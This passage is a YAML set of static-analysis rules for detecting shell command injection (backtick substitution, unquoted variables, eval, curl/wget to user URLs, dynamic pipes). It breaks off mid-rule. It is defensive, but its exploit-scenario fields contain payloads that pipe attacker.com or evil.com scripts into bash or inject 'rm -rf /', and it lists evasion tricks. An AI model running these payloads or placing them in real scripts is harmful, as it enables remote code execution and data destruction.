rules:
- rule_id: SHELL-INJ-001
  title: Command Injection via Backtick Substitution
  description: 'Detects command injection vulnerabilities where user-controlled input is interpolated inside backtick command substitution or $() subshells in shell scripts. Backticks interpret their contents
    as commands, so any unsanitized variable expansion within them allows arbitrary command execution on the host system.

    '
  language: shell
  category: injection
  severity: Critical
  confidence: 0.95
  cwe: CWE-78
  owasp: A03:2021-Injection
  tags:
  - command-injection
  - backtick
  - subshell
  - rce
  - shell-metacharacters
  detection_layer: 2
  attack_surface_type: cli
  patterns:
  - type: regex
    pattern: '`[^`]*\$\{?\w+\}?[^`]*`'
    description: Backtick substitution containing variable expansion
  - type: regex
    pattern: '`[^`]*\$[1-9@\*][^`]*`'
    description: Backtick substitution with positional parameter
  - type: regex
    pattern: \$\([^)]*\$\{?\w+\}?[^)]*\)
    description: Dollar-paren subshell containing variable expansion
  - type: regex
    pattern: '`[^`]*\$\(.*\)[^`]*`'
    description: Nested backtick and dollar-paren substitution
  - type: regex
    pattern: '[a-zA-Z_]\w{0,60}=`[^`]*\$\w{1,40}[^`]*`'
    description: Assignment from backtick substitution with variable
  - type: regex
    pattern: echo\s+`[^`]*\$\{?\w+\}?[^`]*`
    description: Echo with backtick substitution containing variable
  anti_patterns:
  - '# shellcheck'
  - shellcheck disable
  - set -euo pipefail
  - 'readonly '
  - declare -r
  - local -r
  - ${var:-default}
  - shlex.quote
  - printf '%q'
  - sanitize
  - validate
  - whitelist
  - allowlist
  - escapeshellarg
  - '# nosec'
  bypass_variants:
  - description: Backtick injection via IFS manipulation
    pattern: IFS=.*`[^`]*\$\w+
  - description: Encoded backtick via hex escape
    pattern: \\x60[^\\x60]*\$\w+.*\\x60
  - description: Nested subshell via eval and backtick
    pattern: eval\s+.*`[^`]*\$\w+
  evasion_indicators:
  - hex-encoded backtick
  - nested eval with substitution
  - IFS manipulation before substitution
  - variable indirection
  encoding_variants:
  - type: hex_escape
    pattern: \\x60.*\\x60
  - type: octal_escape
    pattern: \\140.*\\140
  multi_function_chain_patterns:
  - read input; command=`$input`
  - curl $url | `cat`
  - eval `command $user_var`
  privilege_context_flags:
    requires_auth_context: false
    admin_only_risk: false
    escalation_vector: Arbitrary command execution on host via backtick substitution
  business_logic_indicator:
    financial_impact: true
    data_exposure_risk: true
    compliance_relevant: true
  probable_taint_paths:
  - source: $1, $2, $@, $*
    sink: backtick or $() substitution
    through: unquoted variable expansion
  - source: read variable
    sink: command substitution
    through: direct interpolation
  - source: environment variable
    sink: subshell execution
    through: unvalidated expansion
  impact: 'Successful exploitation allows arbitrary command execution on the host

    system with the privileges of the running shell process. This can lead

    to full system compromise, data exfiltration, lateral movement, and

    persistent backdoor installation.

    '
  remediation: '- Avoid backtick substitution; prefer $() which is more readable.

    - Always double-quote variable expansions: "$variable".

    - Use arrays for command arguments instead of string interpolation.

    - Validate and sanitize all external input before use in commands.

    - Use printf ''%q'' to escape shell metacharacters.

    - Enable shellcheck in CI/CD pipelines.

    '
  references:
  - https://cwe.mitre.org/data/definitions/78.html
  - https://owasp.org/Top10/A03_2021-Injection/
  - https://www.shellcheck.net/
  context_awareness:
    surrounding_context_patterns:
    - '#!/bin/bash'
    - '#!/bin/sh'
    - '#!/usr/bin/env bash'
    - 'function '
    - read -r
    - getopts
    taint_source_indicators:
    - $1
    - $@
    - $*
    - 'read '
    - QUERY_STRING
    - HTTP_
    taint_sink_indicators:
    - eval
    - exec
    - system
    - popen
    - backtick
    - $(
    sanitization_patterns:
    - printf '%q'
    - shlex.quote
    - escapeshellarg
    - '[[ $var =~ ^[a-zA-Z0-9]+$ ]]'
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A shell script uses backtick substitution with an unsanitized

      filename: result=`cat $filename`. An attacker provides

      filename="; rm -rf / #" to execute a destructive command.

      '
    example_payload: 'filename=''; curl attacker.com/shell.sh | bash #'''
    attacker_objective: Execute arbitrary OS commands via backtick substitution
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  metadata:
    rule_version: 3.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: hardened
    detection_complexity: contextual
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: true
    related_rules:
    - SHELL-INJ-002
    - SHELL-INJ-003
    - SHELL-INJ-010
- rule_id: SHELL-INJ-002
  title: Unquoted Variable Expansion in Commands
  description: 'Detects shell commands where variables are expanded without double quoting, enabling word splitting and glob expansion attacks. When user input flows into unquoted variables used in command
    arguments, attackers can inject additional arguments, redirect output, or trigger filename globbing.

    '
  language: shell
  category: injection
  severity: High
  confidence: 0.88
  cwe: CWE-78
  owasp: A03:2021-Injection
  tags:
  - command-injection
  - word-splitting
  - glob-expansion
  - unquoted-variable
  - shell-script
  detection_layer: 2
  attack_surface_type: cli
  patterns:
  - type: regex
    pattern: (?:rm|mv|cp|chmod|chown|mkdir|cat|ls)\s+[^"']*\$\{?\w+\}?(?:\s|$)
    description: File operation with unquoted variable
  - type: regex
    pattern: (?:curl|wget|fetch)\s+[^"']*\$\{?\w+\}?
    description: Network tool with unquoted variable URL
  - type: regex
    pattern: for\s+\w+\s+in\s+\$\{?\w+\}?(?:\s|;)
    description: For loop iterating over unquoted variable
  - type: regex
    pattern: \[\s+-[a-z]\s+\$\w+\s+\]
    description: Test expression with unquoted variable
  - type: regex
    pattern: (?:tar|zip|unzip|gzip)\s+.*\$\{?\w+\}?[^"']
    description: Archive command with unquoted variable
  - type: regex
    pattern: cd\s+\$\w+
    description: cd with unquoted variable path
  anti_patterns:
  - '"${'
  - '"$('
  - set -u
  - set -euo pipefail
  - shellcheck
  - 'readonly '
  - declare -r
  - local -r
  - '# SC2086'
  - ${var:?}
  - printf "%q"
  - sanitize
  - validate
  - whitelist
  - allowlist
  bypass_variants:
  - description: Word splitting via IFS modification
    pattern: IFS=[^;]*;\s*\w+=\$\w+
  - description: Glob injection via unquoted wildcard variable
    pattern: \$\w+\s*\*
  - description: Argument injection via space in variable
    pattern: \w+\s+\$\w+\s+\$\w+
  evasion_indicators:
  - IFS manipulation
  - glob pattern in variable
  - space-containing values
  - newline injection in variable
  encoding_variants:
  - type: newline_injection
    pattern: \\n.*\$\w+
  - type: tab_injection
    pattern: \\t.*\$\w+
  multi_function_chain_patterns:
  - read input; rm $input
  - filename=$1; cat $filename
  - dir=$INPUT; ls $dir
  privilege_context_flags:
    requires_auth_context: false
    admin_only_risk: false
    escalation_vector: Argument injection and word splitting allow additional command arguments
  business_logic_indicator:
    financial_impact: false
    data_exposure_risk: true
    compliance_relevant: true
  probable_taint_paths:
  - source: positional parameter $1
    sink: file operation command
    through: unquoted variable expansion
  - source: read variable
    sink: command argument
    through: word splitting on spaces
  - source: environment variable
    sink: path argument
    through: glob expansion
  impact: 'Unquoted variable expansion enables word splitting and glob expansion,

    allowing attackers to inject additional command arguments, access

    unintended files, or alter command behavior through crafted input.

    '
  remediation: '- Always double-quote variable expansions: "$variable".

    - Use arrays for lists of arguments: "${args[@]}".

    - Enable shellcheck SC2086 warning in CI/CD pipelines.

    - Use set -u to catch unset variable usage.

    - Use [[ ]] instead of [ ] for conditionals.

    '
  references:
  - https://cwe.mitre.org/data/definitions/78.html
  - https://mywiki.wooledge.org/Quotes
  - https://www.shellcheck.net/wiki/SC2086
  context_awareness:
    surrounding_context_patterns:
    - '#!/bin/bash'
    - '#!/bin/sh'
    - 'function '
    - 'read '
    taint_source_indicators:
    - $1
    - $@
    - 'read '
    - QUERY_STRING
    taint_sink_indicators:
    - 'rm '
    - 'mv '
    - 'cp '
    - 'cat '
    - 'chmod '
    sanitization_patterns:
    - '"$variable"'
    - printf "%q"
    - '[[ ]]'
    - set -u
  severity_scoring:
    severity_weight: 8
    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A backup script uses rm $cleanup_dir without quoting. An attacker

      sets cleanup_dir to "/tmp/x /etc/passwd" causing deletion of both.

      '
    example_payload: cleanup_dir='/tmp/safe /etc/important_config'
    attacker_objective: Manipulate file operations by injecting spaces or glob patterns
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  metadata:
    rule_version: 3.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: hardened
    detection_complexity: contextual
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: true
    related_rules:
    - SHELL-INJ-001
    - SHELL-INJ-003
    - SHELL-INJ-009
- rule_id: SHELL-INJ-003
  title: Eval with User Input
  description: 'Detects use of the eval built-in with variables or expressions that may contain user-controlled input. eval interprets its arguments as shell commands, making it one of the most dangerous
    shell constructs when combined with unsanitized input.

    '
  language: shell
  category: injection
  severity: Critical
  confidence: 0.97
  cwe: CWE-78
  owasp: A03:2021-Injection
  tags:
  - eval-injection
  - command-injection
  - rce
  - shell-builtin
  - critical
  detection_layer: 1
  attack_surface_type: cli
  patterns:
  - type: regex
    pattern: eval\s+[^"']*\$\{?\w+\}?
    description: eval with unquoted variable
  - type: regex
    pattern: eval\s+"[^"]*\$\{?\w+\}?[^"]*"
    description: eval with variable inside double quotes
  - type: regex
    pattern: eval\s+\$\([^)]*\)
    description: eval with command substitution
  - type: regex
    pattern: eval\s+`[^`]*`
    description: eval with backtick substitution
  - type: regex
    pattern: eval\s+"?\$\{?[A-Za-z_]\w*\}?"?
    description: eval with direct variable reference
  - type: regex
    pattern: \beval\b.*\$[1-9@\*#]
    description: eval with positional parameters
  anti_patterns:
  - '# safe: constant'
  - eval set --
  - eval $(dircolors
  - eval $(ssh-agent
  - eval "$(pyenv init
  - eval "$(rbenv init
  - eval "$(nodenv init
  - shellcheck disable=SC2046
  - sanitize
  - validate
  - whitelist
  - allowlist
  - 'readonly '
  - declare -r
  - local -r
  bypass_variants:
  - description: Eval disguised via variable indirection
    pattern: cmd=eval;\s*\$cmd\s+\$\w+
  - description: Eval via bash -c wrapper
    pattern: bash\s+-c\s+.*eval.*\$\w+
  - description: Eval constructed from concatenated strings
    pattern: e="ev";\s*a="al";\s*\$e\$a
  evasion_indicators:
  - variable indirection to eval
  - string concatenation to build eval
  - alias for eval
  - function wrapping eval
  encoding_variants:
  - type: base64_decode
    pattern: eval\s+\$\(base64\s+-d
  - type: hex_decode
    pattern: eval\s+\$\(echo\s+-e\s+.*\\x
  multi_function_chain_patterns:
  - read cmd; eval $cmd
  - user_input=$1; eval $user_input
  - cmd=$(curl $url); eval $cmd
  privilege_context_flags:
    requires_auth_context: false
    admin_only_risk: false
    escalation_vector: Direct arbitrary command execution through eval built-in
  business_logic_indicator:
    financial_impact: true
    data_exposure_risk: true
    compliance_relevant: true
  probable_taint_paths:
  - source: positional parameter $1
    sink: eval built-in
    through: direct variable pass
  - source: read from stdin
    sink: eval command
    through: unvalidated string
  - source: HTTP request parameter
    sink: eval in CGI script
    through: QUERY_STRING variable
  impact: 'eval with user input provides direct arbitrary command execution on

    the host system. This is one of the most critical vulnerability patterns,

    enabling full system compromise with the privileges of the running process.

    '
  remediation: '- Eliminate eval usage entirely where possible.

    - Use associative arrays or case statements instead of eval.

    - If eval is necessary, strictly validate input against a whitelist.

    - Use declare -n for indirect variable references (Bash 4.3+).

    - Never pass user input to eval under any circumstances.

    '
  references:
  - https://cwe.mitre.org/data/definitions/78.html
  - https://mywiki.wooledge.org/BashFAQ/048
  - https://www.shellcheck.net/wiki/SC2091
  context_awareness:
    surrounding_context_patterns:
    - '#!/bin/bash'
    - 'read '
    - getopts
    - 'function '
    - 'while '
    taint_source_indicators:
    - $1
    - $@
    - 'read '
    - QUERY_STRING
    - curl
    - wget
    taint_sink_indicators:
    - eval
    - bash -c
    - sh -c
    sanitization_patterns:
    - case $var in
    - '[[ $var =~ ^[a-zA-Z]+$ ]]'
    - declare -n
    - readonly
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A script reads a configuration key from user input and uses eval

      to access it: eval "value=\$$key_name". An attacker provides

      key_name=''x; curl attacker.com/payload | bash'' to execute RCE.

      '
    example_payload: key_name='x$(curl attacker.com/shell.sh|bash)'
    attacker_objective: Achieve remote code execution by injecting commands through eval
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  metadata:
    rule_version: 3.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: hardened
    detection_complexity: contextual
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: true
    related_rules:
    - SHELL-INJ-001
    - SHELL-INJ-002
    - SHELL-INJ-005
- rule_id: SHELL-INJ-004
  title: Curl/Wget to User-Controlled URL
  description: 'Detects shell commands where curl, wget, or similar HTTP clients fetch content from a URL constructed with user-controlled variables. This enables SSRF, data exfiltration, and RCE when fetched
    content is piped to a shell interpreter.

    '
  language: shell
  category: injection
  severity: High
  confidence: 0.9
  cwe: CWE-918
  owasp: A10:2021-Server-Side-Request-Forgery
  tags:
  - ssrf
  - curl
  - wget
  - url-injection
  - data-exfiltration
  - rce-via-download
  detection_layer: 2
  attack_surface_type: api
  patterns:
  - type: regex
    pattern: curl\s+[^|;]*\$\{?\w+\}?
    description: curl with variable in URL or arguments
  - type: regex
    pattern: wget\s+[^|;]*\$\{?\w+\}?
    description: wget with variable in URL or arguments
  - type: regex
    pattern: curl\s+.*\$\w+.*\|\s*(?:bash|sh|zsh|eval)
    description: curl piped to shell interpreter with variable
  - type: regex
    pattern: wget\s+-O\s*-\s+.*\$\w+.*\|\s*(?:bash|sh)
    description: wget output piped to shell interpreter
  - type: regex
    pattern: curl\s+.*-o\s+\S+\s+.*\$\w+
    description: curl downloading to file with user-controlled URL
  - type: regex
    pattern: curl\s+.*--data.*\$\{?\w+\}?.*\$\{?\w+\}?
    description: curl POST with user data to user URL
  anti_patterns:
  - '# hardcoded URL'
  - https://github.com
  - https://registry.
  - https://api.github.com
  - apt-get
  - brew install
  - pip install
  - --fail
  - --max-time
  - --connect-timeout
  - sanitize
  - validate_url
  - whitelist
  - allowlist
  - curl --version
  bypass_variants:
  - description: SSRF via URL encoding in variable
    pattern: curl\s+.*%[0-9a-fA-F]{2}.*\$\w+
  - description: DNS rebinding via user-controlled hostname
    pattern: curl\s+.*\$\{?hostname\}?
  - description: File protocol SSRF via curl
    pattern: curl\s+.*file://.*\$\w+
  evasion_indicators:
  - URL encoding bypass
  - DNS rebinding
  - file:// protocol
  - gopher:// protocol
  encoding_variants:
  - type: url_encoding
    pattern: curl\s+.*%2[fF]%2[fF].*\$\w+
  - type: double_encoding
    pattern: curl\s+.*%25%32%66.*\$\w+
  multi_function_chain_patterns:
  - url=$1; curl $url | bash
  - read url; wget -O- $url | sh
  - curl $API_URL/$(echo $user_input)
  privilege_context_flags:
    requires_auth_context: false
    admin_only_risk: false
    escalation_vector: SSRF to internal services or RCE via curl pipe to shell
  business_logic_indicator:
    financial_impact: true
    data_exposure_risk: true
    compliance_relevant: true
  probable_taint_paths:
  - source: user-supplied URL parameter
    sink: curl/wget command
    through: unvalidated variable expansion
  - source: API endpoint parameter
    sink: HTTP client command
    through: string concatenation
  - source: configuration file URL
    sink: download and execute
    through: pipe to shell
  impact: 'Fetching URLs from user input enables SSRF attacks against internal

    services, cloud metadata endpoints (169.254.169.254), and data

    exfiltration. When piped to shell, it enables full RCE.

    '
  remediation: '- Validate URLs against a strict allowlist of domains and protocols.

    - Never pipe curl/wget output directly to a shell interpreter.

    - Use --max-time and --connect-timeout to limit request duration.

    - Block access to internal IP ranges and metadata service IPs.

    - Verify downloaded content integrity with checksums before execution.

    '
  references:
  - https://cwe.mitre.org/data/definitions/918.html
  - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
  - https://curl.se/docs/manpage.html
  context_awareness:
    surrounding_context_patterns:
    - '#!/bin/bash'
    - 'function '
    - 'read '
    - getopts
    taint_source_indicators:
    - $1
    - $URL
    - read url
    - QUERY_STRING
    taint_sink_indicators:
    - 'curl '
    - 'wget '
    - '| bash'
    - '| sh'
    sanitization_patterns:
    - validate_url
    - allowlist
    - --max-time
    - checksum verification
  severity_scoring:
    severity_weight: 9
    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A deployment script accepts a plugin URL: curl -sL "$plugin_url" | bash.

      An attacker provides a malicious URL hosting a reverse shell script.

      '
    example_payload: plugin_url='https://evil.com/reverse_shell.sh'
    attacker_objective: Execute remote payloads or access internal services via SSRF
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  metadata:
    rule_version: 3.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: hardened
    detection_complexity: contextual
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: true
    related_rules:
    - SHELL-INJ-003
    - SHELL-INJ-005
    - SHELL-INJ-006
- rule_id: SHELL-INJ-005
  title: Dynamic Pipe Chains with User Input
  description: 'Detects shell commands where user-controlled variables are used to construct pipe chains dynamically. Attackers can inject additional pipe segments, redirect output, or chain arbitrary commands
    by manipulating variables used in pipeline construction.

    '
  language: shell
  category: injection
  severity: High
  confidence: 0.87
  cwe: CWE-78
  owasp: A03:2021-Injection
  tags:
  - pipe-injection
  - command-chain
  - command-injection
  - rce
  - pipeline
  detection_layer: 2
  attack_surface_type: cli
  patterns:
  - type: regex
    pattern: \|\s*\$\{?\w+\}?
    description: Pipe to user-controlled command
  - type: regex
    pattern: \$\{?\w+\}?\s*\|
    description: User-controlled command piped to another
  - type: regex
    pattern: echo\s+.*\$\w+.*\|\s*\$\w+
    description: Echo user data piped to user command
  - type: regex
    pattern: cat\s+.*\|\s*\$\{?\w+\}?
    description: Cat piped to user-controlled command
  - type: regex
    pattern: '[a-zA-Z_]\w{0,60}\s*\|\s*\$\{?\w{1,40}\}?\s*\|\s*\w{1,40}'
    description: Variable command in middle of pipe chain
  - type: regex
    pattern: eval\s+".*\|.*\$\w+.*"
    description: eval constructing pipe chain with variables
  anti_patterns:
  - set -euo pipefail
  - set -o pipefail
  - shellcheck
  - 'readonly '
  - declare -r
  - '| grep'
  - '| awk'
  - '| sed'
  - '| sort'
  - '| head'
  - '| tail'
  - '| wc'
  - sanitize
  - validate
  - whitelist
  bypass_variants:
  - description: Pipe injection via semicolon in variable
    pattern: \$\w+;[^|]*\|
  - description: Process substitution injection
    pattern: <\(\s*\$\w+\s*\)
  - description: Named pipe (FIFO) injection
    pattern: mkfifo.*\$\w+
  evasion_indicators:
  - semicolon injection in pipe variable
  - process substitution with user data
  - named pipe manipulation
  - heredoc injection in pipeline
  encoding_variants:
  - type: newline_injection
    pattern: \\n\s*\|.*\$\w+
  - type: null_byte
    pattern: \\0.*\|.*\$\w+
  multi_function_chain_patterns:
  - filter=$1; cat data | $filter
  - cmd=$1; echo input | $cmd | output
  - processor=$INPUT; data | $processor
  privilege_context_flags:
    requires_auth_context: false
    admin_only_risk: false
    escalation_vector: Arbitrary command injection via pipe chain manipulation
  business_logic_indicator:
    financial_impact: false
    data_exposure_risk: true
    compliance_relevant: true
  probable_taint_paths:
  - source: user-supplied filter command
    sink: pipe chain segment
    through: unvalidated variable in pipeline
  - source: configuration parameter
    sink: dynamic command pipeline
    through: string interpolation
  impact: 'Dynamic pipe chains with user input allow attackers to inject

    additional commands, redirect output to attacker-controlled

    destinations, or execute arbitrary code.

    '
  remediation: '- Avoid constructing pipe chains dynamically with user input.

    - Use predefined command lists and case statements instead.

    - Set pipefail option to detect failures in pipe chains.

    - Validate pipe commands against a strict allowlist.

